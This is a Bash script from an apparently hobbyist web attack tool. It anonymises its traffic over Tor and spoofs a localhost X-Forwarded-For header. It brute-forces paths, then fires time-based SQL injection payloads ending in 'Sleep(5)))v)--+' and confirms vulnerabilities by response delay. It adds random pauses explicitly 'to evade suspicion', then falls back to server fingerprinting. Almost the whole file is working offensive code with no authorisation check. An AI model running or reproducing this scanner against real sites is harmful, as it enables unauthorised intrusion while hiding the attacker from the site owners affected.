# ImCurvin' v1.0.0
# Copyright 2026 Skokoo
# Licensed under the Apache License, Version 2.0

# Code version = 1
# I myself still wondering, why do i name this "risk".
# Welp, sunshine and rainbow. For this file, me will make the variable good name! 
echo ""
echo -e "\e[0;33m[\e[0m!\e[0;33m]\e[0m You just toggle on risk mode.. So, as i promise, RISK MODE ACTIVE." 
echo ""
sleep 3

Cupcake_pie="$(dirname "$0")/../data/targets.txt"
Strawberry_pudding="$(dirname "$0")/../data/sqli.txt"
Choco_muffin="$(dirname "$0")/../data/gentle.txt"
ROOT_LOG_FILE="$(dirname "$0")/../Target.log"

if [ ! -f "$Cupcake_pie" ] || [ ! -f "$Strawberry_pudding" ] || [ ! -f "$Choco_muffin" ]; then
    echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Database files are missing."
    exit 1
fi

if [ -s "$ROOT_LOG_FILE" ]; then
    echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Target.log already contains previous scan data or you just input something on it."
    read -p "$(echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Continuing will overwrite and wipe the old log file. Proceed? (y/n): ")" confirm_overwrite

    case "$confirm_overwrite" in
        [Yy]* )
            > "$ROOT_LOG_FILE"
            echo -e "[i] Target.log cleared. You can continue now\n"
            ;;
        * )
            echo -e "\n\e[0;33m[\e[0m-\e[0;33m]\e[0m Cancelled. You cant continue if your log is not empty."
            exit 0
            ;;
    esac
else
    > "$ROOT_LOG_FILE"
fi

Chicken() {
    local crispy_thigh="$1"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $target_url/$crispy_thigh ( Mode RISK )"
    local http_response=$(curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$target_url/$crispy_thigh" --stderr - | grep "< HTTP")
    echo "$http_response"

    if echo "$http_response" | grep -q "200"; then
        echo "FOUND_200|/$crispy_thigh" >> "$ROOT_LOG_FILE"
        return 0
    fi
    return 1
}

time_audit_engine() {
    local extra_spicy_sauce="$1"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Auditing Latency: $target_url$extra_spicy_sauce"
    local secret_msg_powder="${extra_spicy_sauce}Sleep(5)))v)--+"
    local stopwatch_seconds=$(curl --socks5-hostname 127.0.0.1:9050 -m 12 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$secret_msg_powder")
    echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"

    if (( $(echo "$stopwatch_seconds > 5.0" | bc -l) )); then
        local warm_rice_bowl="${extra_spicy_sauce}Sleep(2)))v)--+"
        local wash_hands_now=$(curl --socks5-hostname 127.0.0.1:9050 -m 8 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$warm_rice_bowl")

        if (( $(echo "$wash_hands_now > 2.0" | bc -l) )) && (( $(echo "$wash_hands_now < 4.0" | bc -l) )); then
            echo -e "[i] Time Delay First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
            echo -e "\e[0;31m[!+!] 'Confirmed' Genuine Time Based Vulnerability!\e[0m"
            echo "SQLI_ALERT|${extra_spicy_sauce}" >> "$ROOT_LOG_FILE"
            return 0
        else
            echo -e "[i] Time Delay First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
            echo -e "\e[0;33m[-] Status: False postive, neither network lag or server defense mechanism detected.\e[0m"
        fi
    else
        echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
        echo -e "\e[0;37m[-] Status: Safe, normal server response time.\e[0m"
    fi
    return 1
}

gentle_probe_engine() {
    local fresh_salad="$1"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Deploying Gentle Probing on $target_url/$fresh_salad"
    local restaurant_cashier=$(curl --socks5-hostname 127.0.0.1:9050 -m 5 -X OPTIONS -A "Mozilla/5.0" -s -Iv "$target_url/$fresh_salad" --stderr - | grep -Ei "< (Allow|Server|X-Powered-By)")
    if [ -n "$restaurant_cashier" ]; then
        echo -e "$restaurant_cashier" | sed 's/^/    -> /'
    else
        echo -e "[i] Status: No explicit server footprint returned."
    fi
    echo ""
}

risk_stage_success="false"
shuf "$Cupcake_pie" | while IFS= read -r target_word || [ -n "$target_word" ]; do
    [[ -z "$target_word" || "$target_word" =~ ^# ]] && continue
    if Chicken "$target_word"; then
        risk_stage_success="true"
    fi
done

if [ "$risk_stage_success" = "false" ]; then
    echo -e "\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Stage 1 failed to acquire 200 OK. Escalating to Time based."
    echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
    sleep 5
    
    sqli_stage_success="false"
    shuf "$Strawberry_pudding" | while IFS= read -r sqli_payload || [ -n "$sqli_payload" ]; do
        [[ -z "$sqli_payload" || "$sqli_payload" =~ ^# ]] && continue
        if time_audit_engine "$sqli_payload"; then
            sqli_stage_success="true"
        fi
        sleep $((5 + RANDOM % 4))
    done
    
    if [ "$sqli_stage_success" = "false" ]; then
        echo -e "\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Time based returned zero anomalies. Dropping gear to Gentle Mode."
        
        shuf "$Choco_muffin" | while IFS= read -r gentle_word || [ -n "$gentle_word" ]; do
            [[ -z "$gentle_word" || "$gentle_word" =~ ^# ]] && continue
            gentle_probe_engine "$gentle_word"
            sleep $((3 + RANDOM % 3))
        done
    fi
fi

echo ""
echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Take your sleep man, for only 1 seconds... uh what. The program itself its done."
sleep 1

read -p "[?] Do you want to me to double check raw hits to eliminate false positives? (y/n): " player_want

case "$player_want" in
    [Yy]* )
        echo -e "\n\e[0;32m[+]\e[0m Waiting..."
        sleep 1
        if ! command -v python3 &> /dev/null; then
            echo -e "\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Python 3 is not installed."
            echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Please install it first to run it."
            echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Aborted. Raw logs still kept in Target.log."
            exit 1
        fi

        python3 "$(dirname "$0")/../validators/validate.py"
        ;;
    * )
        echo -e "\n\e[0;33m[!]\e[0m Post validation skipped. Raw outputs kept inside Target.log file. You can see it if you want tho."
        ;;
esac
